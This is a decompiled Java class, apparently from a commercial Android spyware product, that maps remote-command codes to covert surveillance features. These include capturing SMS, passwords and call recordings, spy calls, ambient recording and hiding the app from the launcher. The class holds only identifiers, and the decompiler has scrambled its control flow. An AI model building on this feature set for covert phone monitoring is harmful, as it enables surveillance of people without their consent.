package com.vvt.remotecommand;

import com.vvt.ak.a;
import com.vvt.base.FeatureId;
import com.vvt.remotecommand.exception.FeatureNotSupportedException;

public class e
{
  private static final boolean a = a.e;
  
  public static FeatureId a(int paramInt)
  {
    Object localObject;
    switch (paramInt)
    {
    default: 
      boolean bool = a;
      if (bool) {}
      localObject = new com/vvt/remotecommand/exception/FeatureNotSupportedException;
      ((FeatureNotSupportedException)localObject).<init>("Feature not availble");
      throw ((Throwable)localObject);
    case 41: 
    case 42: 
    case 43: 
    case 56: 
    case 66: 
      localObject = FeatureId.SPECIAL;
    }
    for (;;)
    {
      return (FeatureId)localObject;
      localObject = FeatureId.CAPTURE_CALLLOG;
      continue;
      localObject = FeatureId.CAPTURE_SMS;
      continue;
      localObject = FeatureId.CAPTURE_LOCATION;
      continue;
      localObject = FeatureId.CAPTURE_EMAIL;
      continue;
      localObject = FeatureId.CAPTURE_MMS;
      continue;
      localObject = FeatureId.CAPTURE_IM;
      continue;
      localObject = FeatureId.CAPTURE_CAMERAIMAGE;
      continue;
      localObject = FeatureId.CAPTURE_SOUND_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_CALL_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_VIDEO_RECORDING;
      continue;
      localObject = FeatureId.CAPTURE_APPLICATION;
      continue;
      localObject = FeatureId.CAPTURE_BROWSER_URL;
      continue;
      localObject = FeatureId.CAPTURE_WALLPAPER;
      continue;
      localObject = FeatureId.CAPTURE_CONTACT;
      continue;
      localObject = FeatureId.CAPTURE_CALENDAR;
      continue;
      localObject = FeatureId.CAPTURE_PASSWORD;
      continue;
      localObject = FeatureId.ADDRESS_BOOK_MANAGEMENT;
      continue;
      localObject = FeatureId.COMMUNICATION_RESTRICTION;
      continue;
      localObject = FeatureId.APP_PROFILE;
      continue;
      localObject = FeatureId.URL_PROFILE;
      continue;
      localObject = FeatureId.PANIC;
      continue;
      localObject = FeatureId.NOTIFICATION_NUMBER;
      continue;
      localObject = FeatureId.HOME_NUMBER;
      continue;
      localObject = FeatureId.CIS_NUMBER;
      continue;
      localObject = FeatureId.MONITOR_NUMBER;
      continue;
      localObject = FeatureId.EMERGENCY_NUMBER;
      continue;
      localObject = FeatureId.SPY_CALL;
      continue;
      localObject = FeatureId.SMS_KEYWORD;
      continue;
      localObject = FeatureId.CALL_WATCH_NOTIFICATION;
      continue;
      localObject = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      continue;
      localObject = FeatureId.AMBIENT_RECORDING;
      continue;
      localObject = FeatureId.HIDE_FROM_APP_DRAWER;
      continue;
      localObject = FeatureId.CAPTURE_VOIP_CALLLOG;
      continue;
      localObject = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */